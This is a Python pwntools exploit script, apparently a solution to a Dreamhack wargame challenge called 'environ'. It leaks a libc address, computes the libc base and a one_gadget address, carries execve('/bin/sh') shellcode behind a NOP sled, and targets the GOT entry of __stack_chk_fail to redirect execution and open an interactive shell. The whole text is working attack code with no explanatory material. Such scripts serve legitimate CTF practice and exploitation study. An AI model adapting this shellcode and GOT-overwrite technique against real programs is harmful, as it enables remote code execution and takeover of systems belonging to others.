#!/usr/bin/python 
from pwn import *

context.arch = 'x86_64'
context.log_level = 'debug'
p = process("./environ")
#p = remote("host1.dreamhack.games", 8239)
elf = ELF("./environ")
libc = elf.libc

p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
log.info("stdout : "+hex(stdout))
libcbase = stdout - 0x3c5620
libc_environ = libcbase + 0x3c6f38
one_gadget = libcbase + 0x4526a
log.info("libcbase : "+hex(libcbase))
log.info("environ : "+hex(libc_environ))

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

pay = '\x90'*(0x20-len(shellcode)) + shellcode

p.sendlineafter("Size: ", str(0xFFFFF) + str(elf.got['__stack_chk_fail']))
gdb.attach(p)

p.sendafter("Data: ", 'A'*0x20)
p.sendlineafter("*jmp=", str(one_gadget))

p.interactive()
